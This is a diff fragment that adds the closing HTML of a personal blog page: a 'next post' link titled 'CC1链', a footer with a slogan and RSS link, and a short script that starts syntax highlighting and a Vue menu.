+                下一篇：CC1链
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">温故而知新</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by pyroxenite | <a class="rss" href="https://pyroxenites.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
